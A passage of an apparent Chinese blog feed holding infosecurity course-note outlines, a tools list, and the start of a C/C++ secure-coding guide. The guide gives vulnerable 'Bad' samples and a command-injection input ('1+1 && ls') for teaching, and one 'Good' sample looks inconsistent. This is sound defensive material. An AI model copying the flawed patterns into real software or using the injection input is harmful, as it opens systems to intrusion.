Algorithm）:从S表中随机选取元素，并产生密钥流</li></ol></li></ol></li></ul></li><li>分组密码：将明文分成不同块（或小组）结构，分别对每个块进行加密或解密</li><li>DES - 数据加密标准</li></ol></li><li><h2 id="非对称密码"><a href="#非对称密码" class="headerlink" title="非对称密码"></a>非对称密码</h2><ol><li>RSA 密码算法</li><li>Diffie - Hellman 密钥交换算法</li><li>ElGamal 加密算法</li></ol></li><li><h2 id="密码学应用"><a href="#密码学应用" class="headerlink" title="密码学应用"></a>密码学应用</h2><ol><li>密码应用模式<ol><li>电子密码本模式（ECB Electronic Code Book）<ul><li>D（E（M）） &#x3D; M</li><li>分组长度为64位，每次加密独立，独立产生密文分组，每一组的加密结果不会影响其他分组。</li></ul></li><li>密文链接模式（CBC Cipher Block Chaining）<ul><li>D ( E (M)  ) &#x3D; M</li><li><strong>第一个明文分组</strong>先向<strong>初始向量</strong>作异或运算再加密，其他每个<strong>明文分组加密之前</strong>，必须与前一个<strong>密文分组</strong>做一次异或运算。</li></ul></li><li>密文反馈模式</li><li>输出反馈模式</li></ol></li><li>密码加密方式<ol><li>节点加密</li><li>链路加密</li><li>端到端加密</li></ol></li><li>PGP软件的应用<h1 id="三、隐藏技术（“隐写术”）"><a href="#三、隐藏技术（“隐写术”）" class="headerlink" title="三、隐藏技术（“隐写术”）"></a>三、隐藏技术（“隐写术”）</h1></li></ol></li><li><h2 id="传统隐藏技术发展"><a href="#传统隐藏技术发展" class="headerlink" title="传统隐藏技术发展"></a>传统隐藏技术发展</h2><ul><li>密码术：将机密信息进行各种变换，使非法授权者无法理解（古代密码学 –&gt; 现代密码学）</li><li>隐写术：将机密信息隐藏起来，使非法授权者无法获取（古代隐写术 –&gt; 信息隐藏、数字水印、隐通道、匿名通信）<ul><li>古代隐写术发展<ol><li>技术性隐写术</li><li>语言学中的隐写术</li><li>用于版权保护的隐写术</li></ol></li></ul></li></ul></li><li><h2 id="数字信息隐藏技术发展"><a href="#数字信息隐藏技术发展" class="headerlink" title="数字信息隐藏技术发展"></a>数字信息隐藏技术发展</h2><ol><li>1992：国际上正式提出信息隐藏概念</li><li>1995：美国Digimarc公司开发了数字水印制作技术</li><li>1996：英国剑桥大学牛顿研究所召开第一届信息隐藏学术会议</li><li>1999：中国已召开六届信息隐藏学术研讨会</li></ol></li><li><h2 id="隐藏技术原理"><a href="#隐藏技术原理" class="headerlink" title="隐藏技术原理"></a>隐藏技术原理</h2><ul><li>目的：把机密信息隐藏在可公开的信息载体中</li><li>“囚犯问题” ：1983年，Simmons对隐蔽通信问题的描述<ol><li>被动狱警问题：只检查传递信息有没有可疑</li><li><strong>主动狱警问题</strong>：不破坏公开信息前提下，故意修改一些可能隐藏机密信息的地方（如同义词替换）</li><li>恶意狱警问题：彻底改变通信信息，或伪装成发送方&#x2F;接收方隐藏伪造的机密信息</li></ol></li><li>信息隐藏相关概念<ul><li>秘密信息M(Secret Message)</li><li>载体对象C(Cover Message)：可公开传递的素材</li><li>伪装对象C^1^：M根据C进行伪装</li><li>伪装密钥k：信息隐藏的密钥</li><li>信息隐藏涉及的算法：信息嵌入算法、信息提取算法</li></ul></li><li>信息隐藏分类<ol><li>1999年Fabien信息隐藏四大类<ol><li>隐通道</li><li><strong>隐写术</strong></li><li>匿名通信</li><li><strong>版权识别</strong></li></ol></li><li>按密钥方案类型分类<ol><li>无密钥的信息隐藏：只隐藏不加密，安全性完全依赖于隐藏算法和提取算法，一旦泄露，失去安全性</li><li>私钥信息隐藏：隐藏信息需要密钥交换，双方拥有一个唯一相同的伪装密钥</li><li>公钥信息隐藏：类似公钥密码【公钥用于信息嵌入，私钥用于信息提取】（安全性完全取决于公钥密码体制的安全性）</li></ol></li></ol></li><li>信息隐藏特性<ul><li>安全性：信息隐藏算法有较强的抗攻击能力，能承受一定的人为攻击而使隐藏信息不被破坏<ul><li>攻破信息隐藏系统的三层次：证明信息存在、提取隐藏信息、破坏隐藏信息</li></ul></li><li>鲁棒性：抗恶意修改导致的隐藏信息能力丢失</li><li>不可检测性：伪装对象和载体对象具有一致的特性</li><li>透明性：经过隐藏处理，目标数据必须没有明显降质现象</li><li>自恢复性：只从留下的片段数据，仍能恢复隐藏信号，且恢复过程不需要宿主信号</li></ul></li></ul></li><li><h2 id="信息隐藏算法"><a href="#信息隐藏算法" class="headerlink" title="信息隐藏算法"></a>信息隐藏算法</h2><ol><li>图像：替换技术【采用秘密信息替代伪装载体中的冗余部分】<ol><li>空间域算法：<ul><li><em>基于图像拉低字节对图像影响较小</em> 原理</li><li>健壮性较差，难以抵抗有损压缩、低通滤波等攻击</li></ul></li><li>变换（频）域算法<ul><li>选择改变中频或低频分量（DCT变换除去直流分量）嵌入信息时，健壮性大大提高</li><li>频域</li></ul></li></ol></li></ol></li><li><h2 id="数字水印"><a href="#数字水印" class="headerlink" title="数字水印"></a>数字水印</h2><ul><li>数字水印基本原理：利用视觉和听觉的冗余特性（水印技术不能阻止盗版）</li><li>通用水印算法组成：水印生成算法、水印嵌入和提取、检测<ul><li>预处理：（扩频、纠错编码、加密等）对水印的安全性考虑进行的处理【通过变频操作：DCT、DFT、小波变换、傅里叶-梅林变换等；变换操作组合；空操作】</li><li>水印提取过程</li></ul></li></ul></li><li><h2 id="隐通道技术"><a href="#隐通道技术" class="headerlink" title="隐通道技术"></a>隐通道技术</h2></li><li><h2 id="匿名通信技术"><a href="#匿名通信技术" class="headerlink" title="匿名通信技术"></a>匿名通信技术</h2><h1 id="四、消息认证技术"><a href="#四、消息认证技术" class="headerlink" title="四、消息认证技术"></a>四、消息认证技术</h1><h1 id="五、数字签名技术"><a href="#五、数字签名技术" class="headerlink" title="五、数字签名技术"></a>五、数字签名技术</h1></li><li><h2 id="数字签名概念-amp-原理"><a href="#数字签名概念-amp-原理" class="headerlink" title="数字签名概念 &amp; 原理"></a>数字签名概念 &amp; 原理</h2><ol><li>概念：通过一个单向函数对咬传送的报文（消息）进行处理，产生别人无法识别的一段数字串，数字串用来证明报文的来源并核实报文是否产生变化</li><li>基础：公钥密码学（密钥 &#x3D; 公钥 + 私钥）</li><li>主要步骤：签名、验证</li></ol></li><li><h2 id="RSA数字签名-amp-加密"><a href="#RSA数字签名-amp-加密" class="headerlink" title="RSA数字签名 &amp; 加密"></a>RSA数字签名 &amp; 加密</h2></li><li><h2 id="Schnorr数字签名（ElGamal型变形）"><a href="#Schnorr数字签名（ElGamal型变形）" class="headerlink" title="Schnorr数字签名（ElGamal型变形）"></a>Schnorr数字签名（ElGamal型变形）</h2></li><li><h2 id="DSA数字签名【数字签名算法】（ElGamel和Schnorr变种）"><a href="#DSA数字签名【数字签名算法】（ElGamel和Schnorr变种）" class="headerlink" title="DSA数字签名【数字签名算法】（ElGamel和Schnorr变种）"></a>DSA数字签名【数字签名算法】（ElGamel和Schnorr变种）</h2><ul><li>安全性基于离散对数难题，采用Schnorr系统中g为非本原元的做法，降低签名文件长度</li></ul></li><li><h2 id="特殊数字签名分类"><a href="#特殊数字签名分类" class="headerlink" title="特殊数字签名分类"></a>特殊数字签名分类</h2><ol><li>盲签名：签名人不知道文件内容</li><li>代理签名：签名权委托代理人</li><li>签名加密：签名同时加密</li><li>多重签名：多人分别对同一文件进行签名</li><li>群签名：由个体代表群体执行的签名，验证者从签名不能判定签名者身份（能通过群管理员查出）</li><li>环签名：类似群签名，具有完全匿名性</li><li>前向安全签名：签名密钥按时间段不断更新，验证公钥保持不变（考虑密钥安全性）</li><li>双线性对技术：利用超奇异椭圆曲线中Weil对和Tate对所具有的双线性性质，构造各种性能良好的数字签名方案</li><li>门限共享、失败-停止签名、不可否认签名、零知识签名 等分支</li></ol></li><li><h2 id="数字签名应用"><a href="#数字签名应用" class="headerlink" title="数字签名应用"></a>数字签名应用</h2><h1 id="六、网络安全协议"><a href="#六、网络安全协议" class="headerlink" title="六、网络安全协议"></a>六、网络安全协议</h1><h1 id="七、攻击技术"><a href="#七、攻击技术" class="headerlink" title="七、攻击技术"></a>七、攻击技术</h1></li><li><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ol><li>踩点</li><li>扫描</li><li>监听</li></ol></li><li><h2 id="攻击实施"><a href="#攻击实施" class="headerlink" title="攻击实施"></a>攻击实施</h2><ol><li>社工</li><li>口令</li><li>漏洞</li><li>欺骗</li><li>拒绝服务</li></ol></li><li><h2 id="隐身技术"><a href="#隐身技术" class="headerlink" title="隐身技术"></a>隐身技术</h2><ol><li>隐藏<ol><li>进程隐藏</li><li>文件隐藏<ol><li>伪装</li><li>隐藏木马文件自身：修改相关程序，过滤信息；指定特殊区域存放（标记扇区为坏区，隐藏其中）</li></ol></li><li>网络连接隐藏<ol><li>替换网络连接进程名</li><li>替换网络连接显示命令</li><li>替换网络连接管理员模块</li></ol></li></ol></li><li>代理<ol><li>snake：支持TCP&#x2F;UDP代理，支持多跳板，代理方式为Socks，默认端口1813</li></ol></li><li>清除日志<ol><li>IIS日志</li><li>主机日志</li></ol></li><li>后门<ol><li>添加管理员帐号</li><li>开启服务端口<h1 id="八、防御技术"><a href="#八、防御技术" class="headerlink" title="八、防御技术"></a>八、防御技术</h1><h1 id="九、病毒"><a href="#九、病毒" class="headerlink" title="九、病毒"></a>九、病毒</h1></li></ol></li></ol></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一、信息安全概述&quot;&gt;&lt;a href=&quot;#一、信息安全概述&quot; class=&quot;headerlink&quot; title=&quot;一、信息安全概述&quot;&gt;&lt;/a&gt;一、信息安全概述&lt;/h1&gt;&lt;h1 id=&quot;二、加密技术&quot;&gt;&lt;a href=&quot;#二、加密技术&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="网络安全" scheme="https://dxhm.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="密码学" scheme="https://dxhm.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>MY FAVOR TOOLS BANK</title>
    <link href="https://dxhm.github.io/2022/03/22/My-Attack-Tools/"/>
    <id>https://dxhm.github.io/2022/03/22/My-Attack-Tools/</id>
    <published>2022-03-22T00:56:02.000Z</published>
    <updated>2023-06-30T10:44:13.055Z</updated>
    
    <content type="html"><![CDATA[<h1 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h1><h2 id="JOPLIN"><a href="#JOPLIN" class="headerlink" title="JOPLIN"></a>JOPLIN</h2><h2 id="ANKI"><a href="#ANKI" class="headerlink" title="ANKI"></a>ANKI</h2><h2 id="MARKTEST"><a href="#MARKTEST" class="headerlink" title="MARKTEST"></a>MARKTEST</h2><h2 id="RIME"><a href="#RIME" class="headerlink" title="RIME"></a>RIME</h2><h2 id="ASF"><a href="#ASF" class="headerlink" title="ASF"></a>ASF</h2><h2 id="Virtualbox"><a href="#Virtualbox" class="headerlink" title="Virtualbox"></a>Virtualbox</h2><h2 id="PotPlayer"><a href="#PotPlayer" class="headerlink" title="PotPlayer"></a>PotPlayer</h2><h2 id="Neat-Download-Manager"><a href="#Neat-Download-Manager" class="headerlink" title="Neat Download Manager"></a>Neat Download Manager</h2><h2 id="OllyDBG"><a href="#OllyDBG" class="headerlink" title="OllyDBG"></a>OllyDBG</h2><h1 id="商业软件（部分含community版）"><a href="#商业软件（部分含community版）" class="headerlink" title="商业软件（部分含community版）"></a>商业软件（部分含community版）</h1><h2 id="Vmware"><a href="#Vmware" class="headerlink" title="Vmware"></a>Vmware</h2><h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><h2 id="Arduino"><a href="#Arduino" class="headerlink" title="Arduino"></a>Arduino</h2><h2 id="Pycharm"><a href="#Pycharm" class="headerlink" title="Pycharm"></a>Pycharm</h2><h2 id="Visual-Studio"><a href="#Visual-Studio" class="headerlink" title="Visual Studio"></a>Visual Studio</h2><h2 id="Visual-Studio-IDE"><a href="#Visual-Studio-IDE" class="headerlink" title="Visual Studio IDE"></a>Visual Studio IDE</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;开源项目&quot;&gt;&lt;a href=&quot;#开源项目&quot; class=&quot;headerlink&quot; title=&quot;开源项目&quot;&gt;&lt;/a&gt;开源项目&lt;/h1&gt;&lt;h2 id=&quot;JOPLIN&quot;&gt;&lt;a href=&quot;#JOPLIN&quot; class=&quot;headerlink&quot; title=&quot;JOPLI</summary>
      
    
    
    
    <category term="开源项目" scheme="https://dxhm.github.io/categories/%E5%BC%80%E6%BA%90%E9%A1%B9%E7%9B%AE/"/>
    
    
    <category term="tools" scheme="https://dxhm.github.io/tags/tools/"/>
    
    <category term="software" scheme="https://dxhm.github.io/tags/software/"/>
    
  </entry>
  
  <entry>
    <title>C/C++ PROGRAM-GUIDE</title>
    <link href="https://dxhm.github.io/2022/03/17/C-PROGRAM-GUIDE/"/>
    <id>https://dxhm.github.io/2022/03/17/C-PROGRAM-GUIDE/</id>
    <published>2022-03-17T13:01:25.000Z</published>
    <updated>2023-06-30T10:47:29.139Z</updated>
    
    <content type="html"><![CDATA[<!-- markdown="1" is required for GitHub Pages to render the TOC properly. --><details markdown="1">  <summary>目录</summary><ul><li><a href="#1">1 通用安全指南</a><ul><li><a href="#1.1">I. C&#x2F;C++使用错误</a><ul><li><a href="#1.1.1">1.1 不得直接使用无长度限制的字符拷贝函数</a></li><li><a href="#1.1.2">1.2 创建进程类的函数的安全规范</a></li><li><a href="#1.1.3">1.3 尽量减少使用 _alloca 和可变长度数组</a></li><li><a href="#1.1.4">1.4 printf系列参数必须对应</a></li><li><a href="#1.1.5">1.5 防止泄露指针（包括%p）的值</a></li><li><a href="#1.1.6">1.6 不应当把用户可修改的字符串作为printf系列函数的“format”参数</a></li><li><a href="#1.1.7">1.7 对数组delete时需要使用delete[]</a></li><li><a href="#1.1.8">1.8 注意隐式符号转换</a></li><li><a href="#1.1.9">1.9 注意八进制问题</a></li></ul></li><li><a href="#1.2">II. 不推荐的编程习惯</a><ul><li><a href="#1.2.1">2.1 switch中应有default</a></li><li><a href="#1.2.2">2.2 不应当在Debug或错误信息中提供过多内容</a></li><li><a href="#1.2.3">2.3 不应该在客户端代码中硬编码对称加密秘钥</a></li><li><a href="#1.2.4">2.4 返回栈上变量的地址</a></li><li><a href="#1.2.5">2.5 有逻辑联系的数组必须仔细检查</a></li><li><a href="#1.2.6">2.6 避免函数的声明和实现不同</a></li><li><a href="#1.2.7">2.7 检查复制粘贴的重复代码</a></li><li><a href="#1.2.8">2.8 左右一致的重复判断&#x2F;永远为真或假的判断</a></li><li><a href="#1.2.9">2.9 函数每个分支都应有返回值</a></li><li><a href="#1.2.10">2.10 不得使用栈上未初始化的变量</a></li><li><a href="#1.2.11">2.11 不得直接使用刚分配的未初始化的内存（如realloc）</a></li><li><a href="#1.2.12">2.12 校验内存相关函数的返回值</a></li><li><a href="#1.2.13">2.13 不要在if里面赋值</a></li><li><a href="#1.2.14">2.14 确认if里面的按位操作</a></li></ul></li><li><a href="#1.3">III. 多线程</a><ul><li><a href="#1.3.1">3.1 变量应确保线程安全性</a> </li><li><a href="#1.3.2">3.2 注意signal handler导致的条件竞争</a> </li><li><a href="#1.3.3">3.3 注意Time-of-check Time-of-use条件竞争</a></li></ul></li><li><a href="#1.4">IV. 加密解密</a><ul><li><a href="#1.4.1">4.1 不得明文存储用户密码等敏感数据</a> </li><li><a href="#1.4.2">4.2 内存中的用户密码等敏感数据应该安全抹除</a> </li><li><a href="#1.4.3">4.3 rand() 类函数应正确初始化</a></li><li><a href="#1.4.4">4.4 在需要高强度安全加密时不应使用弱PRNG函数</a></li><li><a href="#1.4.5">4.5 自己实现的rand范围不应过小</a></li></ul></li><li><a href="#1.5">V. 文件操作</a><ul><li><a href="#1.5.1">5.1 避免路径穿越问题</a></li><li><a href="#1.5.2">5.2 避免相对路径导致的安全问题</a></li><li><a href="#1.5.3">5.3 文件权限控制</a></li></ul></li><li><a href="#1.6">Ⅵ. 内存操作</a><ul><li><a href="#1.6.1">6.1 防止各种越界写</a></li><li><a href="#1.6.2">6.2 防止任意地址写</a></li></ul></li><li><a href="#1.7">Ⅶ. 数字操作</a><ul><li><a href="#1.7.1">7.1 防止整数溢出</a></li><li><a href="#1.7.2">7.2 防止Off-By-One</a></li><li><a href="#1.7.3">7.3 避免大小端错误</a></li><li><a href="#1.7.4">7.4 检查除以零异常</a></li><li><a href="#1.7.5">7.5 防止数字类型的错误强转</a></li><li><a href="#1.7.6">7.6 比较数据大小时加上最小&#x2F;最大值的校验</a></li></ul></li><li><a href="#1.8">Ⅷ. 指针操作</a><ul><li><a href="#1.8.1">8.1 检查在pointer上使用sizeof</a> </li><li><a href="#1.8.2">8.2 检查直接将数组和0比较的代码</a> </li><li><a href="#1.8.3">8.3 不应当向指针赋予写死的地址</a></li><li><a href="#1.8.4">8.4 检查空指针</a></li><li><a href="#1.8.5">8.5 释放完后置空指针</a></li><li><a href="#1.8.6">8.6 防止错误的类型转换</a></li><li><a href="#1.8.7">8.7 智能指针使用安全</a></details></li></ul></li></ul></li></ul><p><a id="1"></a></p><h2 id="通用安全指南"><a href="#通用安全指南" class="headerlink" title="通用安全指南"></a>通用安全指南</h2><p><a id="1.1"></a></p><h3 id="1-C-x2F-C-使用错误"><a href="#1-C-x2F-C-使用错误" class="headerlink" title="1 C&#x2F;C++使用错误"></a>1 C&#x2F;C++使用错误</h3><p><a id="1.1.1"></a></p><h4 id="1-1-【必须】不得直接使用无长度限制的字符拷贝函数"><a href="#1-1-【必须】不得直接使用无长度限制的字符拷贝函数" class="headerlink" title="1.1  【必须】不得直接使用无长度限制的字符拷贝函数"></a>1.1  【必须】不得直接使用无长度限制的字符拷贝函数</h4><p>不应直接使用legacy的字符串拷贝、输入函数，如strcpy、strcat、sprintf、wcscpy、mbscpy等，这些函数的特征是：可以输出一长串字符串，而不限制长度。如果环境允许，应当使用其_s安全版本替代，或者使用n版本函数（如：snprintf，vsnprintf）。</p><p>若使用形如sscanf之类的函数时，在处理字符串输入时应当通过%10s这样的方式来严格限制字符串长度，同时确保字符串末尾有\0。如果环境允许，应当使用_s安全版本。</p><p>但是注意，虽然MSVC 2015时默认引入结尾为0版本的<code>snprintf</code>（行为等同于C99定义的<code>snprintf</code>）。但更早期的版本中，MSVC的<code>snprintf</code>可能是<code>_snprintf</code>的宏。而<code>_snprintf</code>是不保证\0结尾的（见本节后半部分）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（MSVC）</span><br><span class="line">Beginning with the UCRT in Visual Studio <span class="number">2015</span> <span class="keyword">and</span> Windows <span class="number">10</span>, snprintf is no longer identical to _snprintf. The snprintf function behavior is now C99 standard compliant.</span><br><span class="line"></span><br><span class="line">从Visual Studio <span class="number">2015</span>和Windows <span class="number">10</span>中的UCRT开始，snprintf不再与_snprintf相同。snprintf函数行为现在符合C99标准。</span><br><span class="line"></span><br><span class="line">请参考：https:<span class="comment">//docs.microsoft.com/en-us/cpp/c-runtime-library/reference/snprintf-snprintf-snprintf-l-snwprintf-snwprintf-l?redirectedfrom=MSDN&amp;view=vs-2019</span></span><br></pre></td></tr></table></figure><p>因此，在使用n系列拷贝函数时，要确保正确计算缓冲区长度，同时，如果你不确定是否代码在各个编译器下都能确保末尾有0时，建议可以适当增加1字节输入缓冲区，并将其置为\0，以保证输出的字符串结尾一定有\0。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">101</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">snprintf</span>(buf, <span class="built_in">sizeof</span>(buf) - <span class="number">1</span>, <span class="string">&quot;foobar ...&quot;</span>, ...);</span><br></pre></td></tr></table></figure><p>一些需要注意的函数，例如<code>strncpy</code>和<code>_snprintf</code>是不安全的。 <code>strncpy</code>不应当被视为<code>strcpy</code>的n系列函数，它只是恰巧与其他n系列函数名字很像而已。<code>strncpy</code>在复制时，如果复制的长度超过n，不会在结尾补\0。</p><p>同样，MSVC <code>_snprintf</code>系列函数在超过或等于n时也不会以0结尾。如果后续使用非0结尾的字符串，可能泄露相邻的内容或者导致程序崩溃。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="type">char</span> a[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">_snprintf(a, <span class="number">4</span>, <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;AAAA&quot;</span>);</span><br><span class="line">foo = <span class="built_in">strlen</span>(a);</span><br></pre></td></tr></table></figure><p>上述代码在MSVC中执行后， a[4] &#x3D;&#x3D; ‘A’，因此字符串未以0结尾。a的内容是”AAAA”，调用<code>strlen(a)</code>则会越界访问。因此，正确的操作举例如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="type">char</span> a[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">_snprintf(a, <span class="built_in">sizeof</span>(a), <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;AAAA&quot;</span>);</span><br><span class="line">a[<span class="built_in">sizeof</span>(a) - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">foo = <span class="built_in">strlen</span>(a);</span><br></pre></td></tr></table></figure><p>在 C++ 中，强烈建议用 <code>string</code>、<code>vector</code> 等更高封装层次的基础组件代替原始指针和动态数组，对提高代码的可读性和安全性都有很大的帮助。</p><p>关联漏洞:</p><p><code>中风险-信息泄露</code></p><p><code>低风险-拒绝服务</code></p><p><code>高风险-缓冲区溢出</code></p><p><a id="1.1.2"></a></p><h4 id="1-2-【必须】创建进程类的函数的安全规范"><a href="#1-2-【必须】创建进程类的函数的安全规范" class="headerlink" title="1.2  【必须】创建进程类的函数的安全规范"></a>1.2  【必须】创建进程类的函数的安全规范</h4><p>system、WinExec、CreateProcess、ShellExecute等启动进程类的函数，需要严格检查其参数。</p><p>启动进程需要加上双引号，错误例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="built_in">WinExec</span>(<span class="string">&quot;D:\\program files\\my folder\\foobar.exe&quot;</span>, SW_SHOW);</span><br></pre></td></tr></table></figure><p>当存在<code>D:\program files\my.exe</code>的时候，my.exe会被启动。而foobar.exe不会启动。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="built_in">WinExec</span>(<span class="string">&quot;\&quot;D:\\program files\\my folder\\foobar.exe\&quot;&quot;</span>, SW_SHOW);</span><br></pre></td></tr></table></figure><p>另外，如果启动时从用户输入、环境变量读取组合命令行时，还需要注意是否可能存在命令注入。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line">std::string cmdline = <span class="string">&quot;calc &quot;</span>;</span><br><span class="line">cmdline += user_input;</span><br><span class="line"><span class="built_in">system</span>(cmdline.<span class="built_in">c_str</span>());</span><br></pre></td></tr></table></figure><p>比如，当用户输入<code>1+1 &amp;&amp; ls</code>时，执行的实际上是calc 1+1和ls 两个命令，导致命令注入。</p><p>需要检查用户输入是否含有非法数据。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line">std::string cmdline = <span class="string">&quot;ls &quot;</span>;</span><br><span class="line">cmdline += user_input;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(cmdline.<span class="built_in">find_first_not_of</span>(<span class="string">&quot;1234567890.+-*/e &quot;</span>) == std::string::npos)</span><br><span class="line">  <span class="built_in">system</span>(cmdline.<span class="built_in">c_str</span>());</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="built_in">warning</span>(...);</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>高风险-代码执行</code></p><p><code>高风险-权限提升</code></p><p><a id="1.1.3"></a></p><h4 id="1-3-【必须】尽量减少使用-alloca-和可变长度数组"><a href="#1-3-【必须】尽量减少使用-alloca-和可变长度数组" class="headerlink" title="1.3  【必须】尽量减少使用 _alloca 和可变长度数组"></a>1.3  【必须】尽量减少使用 _alloca 和可变长度数组</h4><p>_alloca 和<a href="https://zh.wikipedia.org/wiki/%E5%8F%AF%E5%8F%98%E9%95%BF%E6%95%B0%E7%BB%84">可变长度数组</a>使用的内存量在编译期间不可知。尤其是在循环中使用时，根据编译器的实现不同，可能会导致：（1）栈溢出，即拒绝服务； （2）缺少栈内存测试的编译器实现可能导致申请到非栈内存，并导致内存损坏。这在栈比较小的程序上，例如IoT设备固件上影响尤为大。对于 C++，可变长度数组也属于非标准扩展，在代码规范中禁止使用。</p><p>错误示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">  <span class="type">char</span>* foo = (<span class="type">char</span> *)_alloca(<span class="number">0x10000</span>);</span><br><span class="line">  ..<span class="keyword">do</span> something with foo ..;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foo</span><span class="params">(<span class="type">int</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="type">char</span> msg[size]; <span class="comment">// 不可控的栈溢出风险！</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正确示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="comment">// 改用动态分配的堆内存</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100000</span>; i++) &#123;</span><br><span class="line">  <span class="type">char</span> * foo = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x10000</span>);</span><br><span class="line">  ..<span class="keyword">do</span> something with foo ..;</span><br><span class="line">  <span class="keyword">if</span> (foo_is_no_longer_needed) &#123;</span><br><span class="line">    <span class="built_in">free</span>(foo);</span><br><span class="line">    foo = <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foo</span><span class="params">(<span class="type">int</span> size)</span> </span>&#123;</span><br><span class="line">  <span class="function">std::string <span class="title">msg</span><span class="params">(size, <span class="string">&#x27;\0&#x27;</span>)</span></span>;  <span class="comment">// C++</span></span><br><span class="line">  <span class="type">char</span>* msg = <span class="built_in">malloc</span>(size);  <span class="comment">// C</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>低风险-拒绝服务</code></p><p><code>高风险-内存破坏</code></p><p><a id="1.1.4"></a></p><h4 id="1-4-【必须】printf系列参数必须对应"><a href="#1-4-【必须】printf系列参数必须对应" class="headerlink" title="1.4  【必须】printf系列参数必须对应"></a>1.4  【必须】printf系列参数必须对应</h4><p>所有printf系列函数，如sprintf，snprintf，vprintf等必须对应控制符号和参数。</p><p>错误示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> buf_size = <span class="number">1000</span>;</span><br><span class="line"><span class="type">char</span> buffer_send_to_remote_client[buf_size] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">snprintf</span>(buffer_send_to_remote_client, buf_size, <span class="string">&quot;%d: %p&quot;</span>, id, some_string);  <span class="comment">// %p 应为 %s</span></span><br><span class="line"></span><br><span class="line">buffer_send_to_remote_client[buf_size - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span 